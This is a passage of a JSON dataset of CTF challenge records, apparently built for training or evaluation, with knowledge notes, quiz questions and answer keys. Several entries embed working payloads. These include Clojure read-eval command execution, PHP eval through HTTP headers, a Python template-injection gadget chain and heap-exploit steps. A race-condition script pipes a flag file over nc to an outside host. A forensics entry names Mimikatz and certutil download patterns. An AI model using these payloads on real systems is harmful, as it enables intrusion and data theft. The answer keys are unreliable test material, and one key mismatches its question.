            "For a CTF challenge, if you're aware that the flag is dynamically loaded into memory and is accompanied by a distinct identifier string, which technique would be most effective in extracting the flag from a memory dump? - A. Performing a byte-per-byte comparison of the memory dump with the original binary file. - B. Executing a string search using tools like `grep` with the unique identifier to locate the flag in the memory dump. - C. Recompiling the binary with logging functions to trace the execution flow and flag display. - D. Manually inspecting the memory dump in a hex editor and searching for patterns that resemble flag format. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Holy graal",
        "write_up": "dataset/raw/Holy graal.md",
        "type": "This challenge falls under the category of **web** CTF challenges.",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 477,
        "max_score": 500,
        "difficulty": 0.954,
        "knowledge": [
            "When dealing with languages or platforms that incorporate a `read-string` function or similar (like Clojure in this example), it's crucial to recognize that this functionality can execute arbitrary code provided as input if *read-eval* is not securely configured. A security practice to mitigate such risks is ensuring that *read-eval* is disabled or the input is thoroughly sanitized before being evaluated. If exploitation is necessary (e.g., in a CTF scenario), one can craft payloads that exploit this behavior to execute arbitrary commands.  \nExample payload: `#=(println #=(clojure.java.shell/sh \"ls\"))`",
            "In scenarios where a service or application exposes functionality to execute shell commands indirectly (e.g., through unsafe deserialization or insecure evaluation of inputs), payloads can be crafted to escape the intended input domain and perform arbitrary command execution. This is particularly applicable when input is passed to functions or methods that evaluate the string as code without proper input validation checks. Crafting such payloads requires understanding of the underlying processing mechanism and how it can be manipulated to achieve code execution.  \nExample payload for command execution via unsafe input evaluation in Clojure: `#=(clojure.java.shell/sh \"cat\" \"flag.txt\")`"
        ],
        "question": [
            "In a Clojure application that uses the `read-string` function for input processing, which practice would most effectively prevent the execution of arbitrary code through crafted input strings? - A. Disabling *read-eval* and sanitizing input before evaluation. - B. Increasing the memory allocated to the JVM to handle larger inputs. - C. Encrypting all input strings before processing. - D. Only allowing alphanumeric characters in input strings.",
            "Given an application that indirectly executes shell commands by evaluating user input as code, how can attackers craft payloads to achieve arbitrary command execution when the input is passed to a function that does not properly validate it? - A. By using regular expressions to filter out harmful characters from the command. - B. By encrypting the payload to bypass input validation checks. - C. By inserting comments within the command to obfuscate its intent. - D. By crafting payloads that exploit the evaluation mechanism to execute shell commands."
        ],
        "answer": [
            "A.",
            "D."
        ]
    },
    {
        "name": "Home Office 1",
        "write_up": "dataset/raw/Home Office 1.md",
        "type": "This write-up describes a challenge involving gaining access to a flag file by exploring the filesystem of a Docker container and leveraging a race condition to execute a specific script as an admin user. This challenge falls under the category of **forensics** as it involves analyzing filesystem artifacts and log files to uncover privileged information and manipulate the system to obtain the flag.",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": 287,
        "max_score": 500,
        "difficulty": 0.574,
        "knowledge": [
            "When exploiting vulnerabilities in a script executed with elevated privileges, look for ways to control or overwrite scripts or files that the privileged script will execute. This allows for arbitrary command execution with elevated privileges. A common scenario is when a software installation or administrative script executes other scripts as a part of its process. Modifying these scripts before they're executed by the elevated process can lead to gaining access or extracting information that wouldn't be otherwise accessible.",
            "To handle race conditions where an exploited script or file may be overwritten by the system or another process, continuously write or copy your payload into the target file in a loop. This ensures that your payload will be in the target file when it is executed despite any overwrites. This technique is particularly useful when dealing with installation scripts or automated processes that may overwrite your modifications, and there is uncertainty about the precise timing of execution.\n\nExample payload:\n```\ntouch /tmp/mime.sh\nchmod 777\n\n/bin/cat <<EOF >/tmp/mymime.sh\ncat /home/admin/data/flag.prdx | nc myserver.de 12345\n\nEOF\n\nwhile true;\ndo\n    cp /tmp/mymime.sh /tmp/mime.sh\ndone\n```"
        ],
        "question": [
            "In a scenario where an attacker can inject commands into a script executed as a privileged user during a software installation, which of the following tactics could effectively allow the attacker to execute arbitrary commands with elevated privileges? - A. Encrypting the privileged script to prevent it from executing any commands. - B. Creating a high number of files in the /tmp directory to exhaust system resources. - C. Overwriting or injecting commands into scripts known to be executed by the privileged script. - D. Sending large amounts of data to the script to trigger a buffer overflow. ",
            "When facing a race condition that may overwrite an exploited script or file with the original content during an automated process, which approach ensures that the attacker's payload will be executed? - A. Restarting the target machine to halt the automated process. - B. Continuously writing or copying the attacker's payload into the target file in a loop to counteract any overwrites. - C. Deleting the automated process from the system scheduler. - D. Changing file permissions to read-only to prevent overwrites. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "House of Sus",
        "write_up": "dataset/raw/House of Sus.md",
        "type": "pwn",
        "competition": [
            "Sunshine/2023",
            "https://ctftime.org/event/2079/tasks/"
        ],
        "score": 450,
        "max_score": 450,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving heap exploitation, specifically when dealing with unbounded allocations, the \"house-of-force\" technique can be used to gain arbitrary writes. This is achieved by manipulating the top chunk size to a large value, allowing the next malloc call to \"wrap around\" the heap and overwrite arbitrary memory locations. This method is particularly useful for overwriting GOT entries or function pointers such as `free` with addresses pointing to desired payloads, such as one_gadgets or a win function.   \nExample payload step:  \n   - Overwrite top chunk size: `create_chunk(b\"32\", (b\"A\" * 40) + pwn.p64(0xFFFFFFFFFFFFFFFF))`\n   - Calculate distance to target address and write filler data up to the point just before the target: `create_chunk(str(wrap_distance).encode(), b\"BBBBBBBB\")`\n   - Overwrite target (e.g., GOT entry): `create_chunk(b\"128\", 5 * (pwn.p64(elf.got['free'])))`",
            "To achieve a successful libc leak in memory corruption vulnerabilities, overwrite a GOT entry or a function pointer in writable memory with a known libc address. After executing a call to the overwritten GOT entry or function pointer, it will leak the libc address, enabling calculation of the libc base address and access to system, one_gadgets, or other libc functions. This is crucial for bypassing ASLR (Address Space Layout Randomization) in remote attacks, where the libc version might be known but its base address is randomized.\nExample process for libc leak:  \n   - Create a chunk that will overwrite a known pointer (e.g., GOT of `free`) with the address to leak: `create_chunk(b\"128\", 5 * (pwn.p64(elf.got['free'])))`\n   - Trigger the overwritten function pointer or GOT entry to print out the leaked address: `p.recv(6).ljust(8, b\"\\x00\")`  \n   - Calculate libc base address from leaked address: `libc.address = free_leak - libc.sym['free']`"
        ],
        "question": [
            "During a heap exploitation challenge, which technique allows for arbitrary writes by manipulating the top chunk's size? - A. Fastbin dup - B. House-of-force - C. Tcache poisoning - D. Unlink attack ",
            "In a scenario where you need to bypass ASLR in a remote attack by leaking a libc address, what step is crucial after overwriting a GOT entry or function pointer? - A. Immediately crash the program to analyze the core dump. - B. Perform a series of malloc and free operations to trigger a heap consolidation. - C. Execute the overwritten function to leak the libc address. - D. Use a brute-force attack to guess the libc base address. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "House of Sweets And Selfies",
        "write_up": "dataset/raw/House of Sweets And Selfies.md",
        "type": "reverse",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a heap overflow vulnerability, specifically in challenges involving memory management libraries such as jemalloc, one can manipulate the tcache (thread cache) entries to gain arbitrary control over memory allocations and deallocations. This can be achieved by carefully crafting inputs to cause an overflow that modifies the metadata of adjacent tcache entries, such as the `ncached` value and the `avail` pointer within a `tcache_bin_s` structure. This manipulation enables control over the addresses returned by subsequent `malloc` calls, or the destinations of pointers freed by `free` calls, facilitating leaks of memory addresses or even arbitrary code execution.",
            "In scenarios where a binary allows for the creation and modification of data structures (such as 'cakes' in the provided example) with both controlled size and content, heap-based attacks can be strategized to leak important addresses (heap, libc, stack) and eventually execute arbitrary code. This requires a deep understanding of the binary's allocation patterns and the underlying allocator's behavior (jemalloc in this context). The steps typically involve: a) causing a controlled overflow to overwrite metadata in a manner that `malloc` or `free` encounters altered `tcache` structures; b) crafting subsequent allocations or deallocations to write or leak addresses from controlled or known positions; c) utilizing leaks to calculate offsets for critical structures or functions (like `environ` for stack leaks, or known libc addresses for libc leaks); d) and finally, crafting payloads that overwrite return addresses or function pointers to hijack execution flow, such as overwriting a return address with the location of a 'one gadget' for shell execution."
        ],
        "question": [
            "In the context of exploiting a heap overflow to manipulate the Tcache entries in a system using jemalloc, which of the following correctly describes what an attacker can achieve by modifying the `ncached` value and the `avail` pointer of a `tcache_bin_s` structure? - A. Increase the speed of memory allocations by the allocator. - B. Prevent any allocations from happening, causing a denial of service. - C. Control the addresses returned by `malloc` calls and the destinations of pointers freed by `free` calls. - D. Randomize the memory layout to protect against buffer overflow attacks. ",
            "When endeavoring to execute arbitrary code through heap exploitation by manipulating cake data structures in a binary that utilizes jemalloc, what is the first critical step towards achieving this? - A. Incrementing the `ncached` value to trigger automatic garbage collection. - B. Causing a controlled overflow to alter the metadata of adjacent tcache entries. - C. Deleting all existing cake structures to clear the memory and start fresh. - D. Allocating a large number of cakes to exhaust the memory and cause a crash. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "How to Breakdance",
        "write_up": "dataset/raw/How to Breakdance.md",
        "type": "This is a **forensics** challenge.",
        "competition": [
            "UMDCTF/2022",
            "https://ctftime.org/event/1593/tasks/"
        ],
        "score": -1,
        "max_score": 987,
        "difficulty": -1,
        "knowledge": [
            "When analyzing USB keyboard packet capture (pcapng) files in Capture The Flag (CTF) challenges, utilize specialized tools like `ctf-usb-keyboard-parser` to decode the keypresses from the USB capdata. This process reveals meaningful data such as passwords, URLs, and typed messages, which can be critical for solving the challenge.",
            "In challenges involving USB data capture, apply `tshark` to filter and extract the hex-encoded USB capdata related to keyboard input by focusing on packets where `usb.data_len == 8`. Then, preprocess this data by inserting colons between bytes using `sed`, making it compatible with keyboard data parsing tools. This step is pivotal for transforming raw USB capture data into a human-readable format for further analysis.\n   \n   Example command sequence:\n   - Extract and format keyboard data: `tshark -r <file.pcapng> -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > formatted_keydata`\n   - Decode extracted data: `python usbkeyboard.py formatted_keydata`"
        ],
        "question": [
            "When investigating a USB keyboard packet capture in a CTF challenge, which tool is recommended for decoding the captured key presses? - A. Wireshark with default settings - B. A standard text editor - C. `ctf-usb-keyboard-parser` - D. USB capture hardware",
            "To prepare USB keyboard capture data from a `.pcapng` file for decoding, which sequence of commands is correct? - A. `wireshark -r <file.pcapng> -F 'usb.capdata && usb.data_len == 8' -e usb.capdata > formatted_keydata` - B. `tshark -r <file.pcapng> -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > formatted_keydata` - C. `tcpdump -r <file.pcapng> -filter 'usb.capdata && usb.data_len == 8' -output usb.capdata > formatted_keydata` - D. `curl -r <file.pcapng> -G 'usb.capdata && usb.data_len == 8' -d usb.capdata > formatted_keydata`"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "How to Get Started",
        "write_up": "dataset/raw/How to Get Started.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": -1,
        "max_score": 666,
        "difficulty": -1,
        "knowledge": [
            "When encountering encoded or encrypted strings in CTF challenges, it's important to consider common encoding schemes or ciphers based on the composition of the string (for example, if it consists of letters and numbers, base64 could be a possibility). However, without explicit hints, this approach might not always yield the correct results. For instance, decoding a string that appears to be base64 encoded without proper context or understanding of the encoding scheme used may lead to incorrect interpretations or output unprintable characters. This process reinforces the importance of not relying solely on the string's appearance but also considering the context and any available hints to determine the correct decoding method.",
            "In CTF challenges that involve exploring websites or documents for flags, it's crucial to thoroughly inspect all available resources. This includes not just the obvious content but also looking for subtle hints or hidden elements. For example, exploring version control history, such as using the sliding version history feature on GitHub, can reveal hidden hints or information that is not visible in the latest version of the content. This approach of paying close attention to document changes over time or hidden elements within the page can uncover clues leading to the flag. Additionally, the challenge underscores the importance of reading documentation or provided resources carefully, as hints or flags may be embedded within seemingly mundane or overlooked details."
        ],
        "question": [
            "When attempting to decipher a string \"d8f1328d\" that seemed to be encoded and exploring various encoding schemes, which of the following commands was incorrectly assumed to potentially decode a base64 encoded string but resulted in \"wo\" and an unprintable character? - A. echo \"d8f1328d\" | base64 - B. echo \"d8f1328d\" | base64 --decode - C. decode_base64(\"d8f1328d\") - D. echo \"d8f1328d\" | base64 -d",
            "While investigating a GitHub repository for clues in a CTF challenge, which approach ultimately revealed a hint hidden within the page, indicating a closer inspection of documents was necessary? - A. Scrolling through the GitHub page source code looking for hidden comments. - B. Using the Wayback Machine to find historical versions of the GitHub repository. - C. Utilizing the version control's sliding version history feature on GitHub to uncover hidden hints. - D. Running a script to automatically check for the flag in all pages linked from the main GitHub page."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "HPNY",
        "write_up": "dataset/raw/HPNY.md",
        "type": "web",
        "competition": [
            "TetCTF/2021",
            "https://ctftime.org/event/1213/tasks/"
        ],
        "score": 100,
        "max_score": 995,
        "difficulty": 0.10050251256281408,
        "knowledge": [
            "When faced with strict input validation that limits the characters and length of payloads for executing PHP code, consider utilizing HTTP headers to deliver the payload. This approach gets around input restrictions by embedding the malicious code in headers, which are not subject to the same validation. Payload delivery through headers can be effective in scenarios where the application uses or can be tricked into using header values within an eval function or similar dynamic code execution contexts.\n\n    Sample payload delivery using User-Agent header:\n    ```\n    User-Agent: eval(system('cat /path/to/flag/file'))\n    ```",
            "To execute PHP code embedded in HTTP headers, leverage PHP's `getallheaders()` function to retrieve all request headers as an array, and then use `implode()` to convert this array into a single string that contains all header values concatenated together. This string can then be passed to the `eval()` function for execution. To prevent syntax errors or unintended code execution due to additional contents in headers, encapsulate the payload in PHP comment syntax (`/* ... */`) and strategically place start (`/*`) and end (`*/`) comment tokens in separate custom headers to ensure only the intended code is executed.\n\n    Final exploit request format incorporating comments to isolate the payload:\n    ```\n    GET /?roll=(eval(implode(getallheaders()))) HTTP/1.1\n    Custom-Header-Start: /*\n    ...\n    User-Agent: */ eval(system('cat /path/to/flag/file'));/*\n    ...\n    Custom-Header-End: */\n    ```"
        ],
        "question": [
            "In a PHP application vulnerable to code injection via query parameters, which function would effectively bypass input validation limits by leveraging HTTP headers to execute a payload? - A. `header(\"Location: /path/to/exploit\");` - B. `file_get_contents(\"php://input\");` - C. `eval(\"echo $_GET['cmd'];\");` - D. `eval(\"echo implode(getallheaders());\");`",
            "When attempting to execute PHP code embedded in HTTP headers to bypass input validation, how should the payload be properly encapsulated to avoid execution errors caused by the presence of additional contents in the headers? - A. Surround the payload with `<?php ?>` tags in the User-Agent header. - B. Enclose the payload within `/* ... */` comments, distributed in separate custom headers before and after the malicious payload. - C. Prepend and append the payload with `echo` statements in separate headers. - D. Use base64 encoding for the payload in the headers and decode before execution."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "http-for-pros",
        "write_up": "dataset/raw/http-for-pros.md",
        "type": "web",
        "competition": [
            "Defcamp/2020",
            "https://ctftime.org/event/1182/tasks/"
        ],
        "score": 200,
        "max_score": 972,
        "difficulty": 0.205761316872428,
        "knowledge": [
            "When encountering a web application that reflects user input and certain characters are blacklisted, indicating a potential template injection vulnerability, bypassing character blacklists is crucial. Utilizing an array-like accessor `[ ]` instead of the dot notation `.` can be a viable workaround for accessing object attributes. This can be particularly effective when direct attribute access is blocked, for example, bypassing the restriction on accessing `__class__` by using request parameters or cookies to reference the required attribute indirectly. An example of such bypass could be setting a cookie or parameter with the value `__class__` and then referencing it like `request[request.cookies['a']]` in case dot notation or underscores are restricted.",
            "In scenarios where an application is vulnerable to template injection, and direct execution of functions like `__import__` is blocked, constructing a gadget chain that leverages the application's own attributes and functions is a powerful technique for achieving remote code execution (RCE). By chaining attributes and methods such as `request._get_file_stream.im_func.func_globals['__builtins__']['__import__']`, one can dynamically import modules and execute functions, including those that allow command execution, such as `subprocess.check_output`. This is particularly useful in environments where WAFs or other security measures restrict traditional payloads. An example payload to execute system commands via template injection, using cookies to bypass blacklists and construct the gadget chain, is as follows: `{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'], shell=True)}}`. This payload dynamically constructs a call to `subprocess.check_output` with the command contained in a cookie, enabling arbitrary command execution within the constraints of the server's permissions."
        ],
        "question": [
            "In a web application where direct access to object attributes is blocked due to character blacklisting, which of the following methods can be employed to indirectly access the `__class__` attribute?  - A. Using dot notation and direct attribute names (e.g., `request.__class__`) - B. Utilizing an array-like accessor (e.g., `request[request.cookies['a']]`) where `a` is set to `__class__` - C. Employing regular expressions to manipulate string attributes directly - D. Concatenating strings to bypass the blacklist ",
            "When constructing a gadget chain to achieve remote code execution in a web application suffering from a template injection vulnerability, which chained attribute and method effectively allow the dynamic import of modules and execution of arbitrary commands?  - A. `request.post.im_data.func_globals['__builtins__']['eval']` - B. `request.GET.im_values.func_headers['__builtins__']['exec']` - C. `request._get_file_stream.im_func.func_globals['__builtins__']['__import__']` - D. `request.session.im_cookies.func_meta['__builtins__']['compile']` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Hunting into the wild",
        "write_up": "dataset/raw/Hunting into the wild.md",
        "type": "forensics",
        "competition": [
            "Defcamp/2020",
            "https://ctftime.org/event/1182/tasks/"
        ],
        "score": 972,
        "max_score": 972,
        "difficulty": 1.0,
        "knowledge": [
            "When investigating incidents within Windows environments that involve potential credential dumping or malware activity, searching through log data (e.g., by using tools like ELK stack for log management) can be crucial. Specifically, look for evidence of known hacking tools or scripts by their process names, command-line arguments, or file access patterns. Knowledge of popular hacking tool syntax, such as `sekurlsa::LogonPasswords` for Mimikatz, can guide the search. Example search query: `\"sekurlsa::LogonPasswords\" OR \"mim.exe\"`.",
            "Identifying the initiation of malware downloads or suspicious command execution in a compromised Windows environment can often be achieved by examining command-line execution logs for specific patterns, such as the use of native Windows utilities in unconventional ways. For example, `certutil.exe` with `-urlcache`, `-split`, and `-f` flags downloading files from the internet can be indicative of a malicious operation. This highlights the importance of monitoring for abuse of built-in utilities like `certutil`, which can be utilized for file download or malware staging. Example search query to identify malicious file download: `certutil.exe -urlcache -split -f URL FILEPATH`."
        ],
        "question": [
            "When investigating a Windows environment for credential dumping activity, which command line argument would be an indicative sign of using Mimikatz, a popular hacking tool? - A. `-active:yes` - B. `sekurlsa::LogonPasswords` - C. `-urlcache -split -f` - D. `/c`",
            "In a compromised Windows environment, which native utility's command line usage would strongly suggest a file download or malware staging operation, particularly if accompanied by `-urlcache`, `-split`, and `-f` flags? - A. `cmd.exe` - B. `mim.exe` - C. `net user` - D. `certutil.exe`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "I have a dream",
        "write_up": "dataset/raw/I have a dream.md",
        "type": "misc",
        "competition": [
            "Tenable/2021",
            "https://ctftime.org/event/1266/tasks/"
        ],
        "score": 100,
        "max_score": 250,
        "difficulty": 0.4,
        "knowledge": [
            "When faced with a binary file and a hint that suggests the content may be derived from historical or well-known text, consider the possibility of XOR encryption. The initial step involves using a known plaintext attack where a segment of the presumed plaintext is XORed with a portion of the ciphertext. This helps in identifying the XOR key. An example in Python for calculating the XOR key can be structured as follows:  \n```python\nfrom pwn import xor\nknown_plaintext = b\"Known segment of text\"  \nciphertext = open(\"encrypted_file.dat\", \"rb\").read()  \nxor_key = xor(known_plaintext, ciphertext[:len(known_plaintext)])  \nprint(xor_key)\n```",
            "Once the XOR key is identified, it can be used to decrypt the entire ciphertext. If decoding the XOR result leads to unintelligible characters, it might be beneficial to attempt decoding it using different character encodings until readable text is obtained. Additionally, it may be necessary to manipulate the decoded text, such as removing newlines, to extract the final information correctly. The Python code snippet for decrypting the ciphertext and adjusting the decoding parameters is as follows:\n```python\ndecrypted_text = xor(ciphertext, xor_key).decode(\"chosen_character_encoding\").replace(\"unwanted_character\", \"replacement_character\")  \n```\n\nThese steps demonstrate a practical approach to address challenges involving XOR encryption and the importance of selecting appropriate character encodings for decoding the decrypted plaintext."
        ],
        "question": [
            "When analyzing a binary file that is suspected to contain text encrypted with XOR, which method can help in identifying the encryption key if a portion of the plaintext is known or guessed? - A. Applying a differential cryptanalysis to the first block of text. - B. Comparing the file's hash value with known hashes of the plaintext. - C. XORing a known plaintext segment with a corresponding segment of the ciphertext to reveal the key. - D. Using a brute force attack to try all possible keys until the plaintext is correctly revealed.",
            "After decrypting a ciphertext with an XOR key, you encounter unintelligible characters. What should your next step be to ensure the decrypted text is readable? - A. Convert the binary data directly into ASCII before applying the XOR operation. - B. Use a reverse hashing technique to interpret the XOR output. - C. Attempt decoding the result with various character encodings and replace unwanted characters as needed. - D. Increase the size of the XOR key in multiples until the characters become legible."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "I'm so random",
        "write_up": "dataset/raw/I'm so random.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 100,
        "max_score": 300,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "When encountering a PRNG (Pseudo-Random Number Generator) in a CTF challenge, specifically one based on the middle square method, it's possible to reverse-engineer future outputs by factoring a given output into its components, assuming it's the result of multiplying two numbers generated by similar PRNGs. This approach bypasses the need to directly crack the PRNG's algorithm or seed values. This is particularly applicable in scenarios where the PRNG's operation and outputs are partially observable or interactable through a challenge interface.",
            "For effectively decomposing a product of two numbers back into its original factors under the constraint of a CTF challenge, leveraging mathematical libraries or frameworks capable of enumerating divisors, such as SageMath, can be invaluable. This method relies on the assumption that given numbers are products of two relatively large factors, which can be iteratively tested to find a matching pair that reproduces subsequent outputs when processed the same way as the PRNG does.\n\nSample Code Snippet:\n```python\nfrom sage.all import divisors  # Importing divisors function from SageMath library\n\ndef find_r(x, y):  \n   d = divisors(x)  \n   for r1 in d:  \n       if not valid(r1):  # Assuming a validity check function exists\n           continue  \n       r2 = x // r1  \n       if not valid(r2):  \n           continue  \n  \n       g1 = Generator(r1)  # Assuming a similar PRNG implementation is available\n       g2 = Generator(r2)  \n       o = g1.getNum() * g2.getNum()  \n       if o == y:  # Comparing the product of generated numbers to the next output from the server\n           return (r1, r2)  \n\n   raise Exception('Divisors not found')\n```"
        ],
        "question": [
            "In a cryptography challenge, you are given a number resulted from multiplying two numbers generated by a custom PRNG. The PRNG squares a seed and takes the middle digits as the next output. You aim to predict the next output of the PRNG. Given this scenario, which technique would be most effective for predicting future outputs?  - A. Brute force all possible seed values until a matching sequence is found. - B. Reverse engineer the PRNG algorithm to find a mathematical flaw. - C. Factor the given number into its components, and use those to simulate the PRNG for future outputs. - D. Intercept and modify the PRNG algorithm's seed while in operation. ",
            "When working on a cryptography challenge involving factoring a product of two numbers to reverse-engineer a PRNG's next outputs, and you are given a number as the product of two seeds generated by such a PRNG. You need to find an efficient way to list possible factors of a given number to test as potential seeds. Which tool or library would you most likely utilize for this purpose based on the provided scenario?  - A. NumPy for high-performance numerical computing. - B. TensorFlow for leveraging machine learning models to guess factors. - C. SageMath for accurately and efficiently enumerating divisors of the given number. - D. Flask for creating a web interface to manually input guesses for factors. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "i-love-heddha",
        "write_up": "dataset/raw/i-love-heddha.md",
        "type": "web",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When navigating a website in a CTF challenge and encountering error messages or unusual responses, checking `robots.txt` can lead to discovering hidden or restricted directories. This is a common technique for uncovering paths that developers intend to hide from web crawlers but can be exploited to find potential vectors for deeper access.",
            "In scenarios where access to a specific resources requires passing certain checks, modifying HTTP request headers can bypass these restrictions. The common headers to modify include `User-Agent`, to mimic a specific browser requirement, and `Referer`, to fake the origin of the request. For content encoded in Base64, using command line tools like `curl` to fetch the content followed by a tool to decode Base64 can reveal hidden messages or flags.\n   - To pass a `User-Agent` check, use: `-A \"Builder browser 1.0.1\"`\n   - To pass a `Referer` check, use: `-H \"Referer: hackover.18\"`\n   - To decode a Base64 encoded string: `| base64 -D`"
        ],
        "question": [
            "When specifically attempting to uncover hidden or restricted directories on a website during a cybersecurity challenge, which file should you consult first to potentially reveal such paths? - A. `/index.html` - B. `/config.json` - C. `/robots.txt` - D. `/sitemap.xml` ",
            "In a situation where accessing a server's resources requires mimicking a specific browser and falsifying the origin of the request, which command line tools and options would correctly bypass these restrictions and decode a Base64 encoded response? - A. Use `wget` with options `-user-agent` and `-referer`, followed by `openssl base64 -d` for decoding. - B. Use `curl` with options `-A` for setting the `User-Agent`, `-H` for modifying the `Referer` header, and pipe the output to `base64 -D` for decoding. - C. Use `fetch` with parameters `-U` for `User-Agent` and `-R` for `Referer`, then use `decode64` for the output. - D. Use `http` with flags `--agent` and `--referrer`, then pass the output through `base64 --decode`. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "ICAN'TBELIEVEIT'SNOTCRYPTO",
        "write_up": "dataset/raw/ICAN'TBELIEVEIT'SNOTCRYPTO.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 314,
        "max_score": 233123.2321,
        "difficulty": 0.001346927104482265,
        "knowledge": [
            "When faced with a challenge that requires analyzing a mathematical or algorithmic process to pass a specific condition (e.g., a step count requirement), research known problems or conjectures that might match the challenge's description. The Collatz conjecture, for example, can be applied if the challenge involves iterative transformations on numbers translating into step counts toward a specific condition. This approach can uncover shortcuts or optimized solutions leveraging prior mathematical work.",
            "Converting numbers between different bases or representations can be a critical step in solving challenges. When a challenge involves manipulations or conditions on lists or arrays that seem arbitrary, consider if those lists might represent numbers in a non-standard base or split across multiple arrays. The ability to translate back and forth between these bespoke representations and a more conventional form (like integers) can be key to understanding the challenge's underlying logic and crafting a solution. A Python snippet for converting a number to two lists, each representing bits of the base-6 representation of the number, then back to its original form, is an example of such a tactic:\n   - Conversion from a single integer to two lists (representing base-6 digits split across the lists):\n     ```python\n     def to_lists(num):\n         l1 = []\n         l2 = []\n         while num:\n             digit = num % 6\n             l1.append(digit & 1)\n             l2.append(digit >> 1)\n             num //= 6\n         return l1, l2\n     ```\n   - Conversion back from the two lists to the original integer:\n     ```python\n     def from_lists(l1, l2):\n         num, mul = 0, 1\n         for i in range(len(l1)):\n             digit = l1[i] | (l2[i] << 1)\n             num += digit * mul\n             mul *= 6\n         return num\n     ```"
        ],
        "question": [
            "In a challenge requiring analysis of step counts toward a specific condition, which mathematical conjecture could provide a shortcut by identifying a starting value associated with a high step count? - A. Fermat's Last Theorem - B. The Collatz conjecture - C. Goldbach's conjecture - D. The Riemann Hypothesis",
            "When solving a challenge that uses arbitrary lists or arrays to manipulate numbers, which Python code snippet correctly demonstrates converting a number to two lists representing base-6 digits split across the lists, and then back to the original number? - A. A function that converts numbers directly to base-2 binary representation, without splitting into two lists. - B. A function that splits base-10 numbers into two lists based on their parity (odd or even digits). - C. A function that converts a number into two lists where each list represents half of the base-10 number, then merges them back. - D. A Python script where the function `to_lists` converts a number to its base-6 form, splitting the digit across two lists (`l1` and `l2`), and the function `from_lists` converts these lists back to the original number."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Ice Cream Generator",
        "write_up": "dataset/raw/Ice Cream Generator.md",
        "type": "misc",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When facing LCG (Linear Congruential Generator) challenges and partial parameters are known, specific steps can be followed to recover the remaining parameters. If the modulus \\(p\\) and the seed are known but the multiplier \\(a\\) and increment \\(c\\) are unknown, you can utilize generated numbers \\(X_1, X_2, X_3, ...\\). First, recover \\(a\\) using the formula \\(a \\equiv \\frac{X_3 - X_2}{X_2 - X_1} \\mod m\\). Then, recover \\(c\\) with \\(c \\equiv X_2 - aX_1 \\mod m\\). This method becomes practical when at least three consecutive generated numbers \\(X_1, X_2, X_3\\) can be obtained or derived from the application's output.",
            "In LCG challenges where direct access to generated random values is not provided, indirect methods can be employed to leak or deduce these values. This often involves manipulating application logic or output to reveal hidden internal states. For instance, if an application uses LCG-generated values to manipulate data in a predictable way, sequences of operations can be crafted to isolate and retrieve individual generated values. This typically requires understanding how operations affect data and finding sequences that simplify or reveal the LCG's output. This approach was applied by leveraging sequence operations (add, subtract, multiply, divide) on controlled input to deduce LCG parameters indirectly.\n\nExample payload to recover parameter `a`:\n- Initial state with three bowls: `[0, 0, 0]`\n- Perform operations:\n  1. Add \\(X_2\\) to bowl 1: `[X_2, 0, 0]`\n  2. Add \\(X_3\\) to bowl 2: `[X_2, X_3, 0]`\n  3. Subtract bowl 2 from bowl 1: `[(X_2 - X_3) mod p, 0, 0]`\n  4. Add \\(X_1\\) to bowl 2: `[(X_2 - X_3) mod p, X_1, 0]`\n  5. Add \\(X_2\\) to bowl 3: `[(X_2 - X_3) mod p, X_1, X_2]`\n  6. Subtract bowl 3 from bowl 2: `[(X_2 - X_3) mod p, (X_1 - X_2) mod p, 0]`\n  7. Divide bowl 1 by bowl 2: `[a = ((X_2 - X_3) / (X_1 - X_2)) mod p, 0, 0]`\n- Use the operation results to calculate `a`."
        ],
        "question": [
